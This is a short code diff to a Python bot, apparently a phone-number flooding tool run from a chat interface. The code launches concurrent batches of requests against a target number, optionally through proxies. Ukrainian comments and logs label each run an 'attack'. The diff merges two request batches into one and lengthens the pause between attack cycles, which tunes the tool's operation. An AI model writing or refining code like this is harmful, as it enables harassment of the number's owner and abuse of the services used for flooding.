@@ -1497,21 +1497,14 @@ async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
     if not attack_flags.get(chat_id):
         return
     
-    # Створюємо і виконуємо першу пачку
-    first_batch = create_requests()
-    if first_batch:
-        logging.info(f"Запускаю першу пачку ({len(first_batch)} запитів)")
-        await asyncio.gather(*first_batch, return_exceptions=True)
-        logging.info("Перша пачка завершена")
+    # Створюємо і виконуємо всі запити один раз
+    requests_batch = create_requests()
+    if requests_batch:
+        logging.info(f"Запускаю атаку ({len(requests_batch)} запитів)")
+        await asyncio.gather(*requests_batch, return_exceptions=True)
+        logging.info("Атака завершена")
     else:
         logging.warning("Список запитів порожній!")
-    
-    # Створюємо і виконуємо другу пачку (той самий масив, але нові корутини)
-    second_batch = create_requests()
-    if second_batch:
-        logging.info(f"Запускаю другу пачку ({len(second_batch)} запитів)")
-        await asyncio.gather(*second_batch, return_exceptions=True)
-        logging.info("Друга пачка завершена")
 
 async def start_attack(number, chat_id):
     global attack_flags
@@ -1566,7 +1559,7 @@ async def start_attack(number, chat_id):
                 except Exception:
                     pass
                 return
-            await asyncio.sleep(1.0)  # Затримка 1 секунда між циклами
+            await asyncio.sleep(10.0)  # Затримка 10 секунд між циклами (після повного завершення атаки)
             
     except asyncio.CancelledError:
         try:
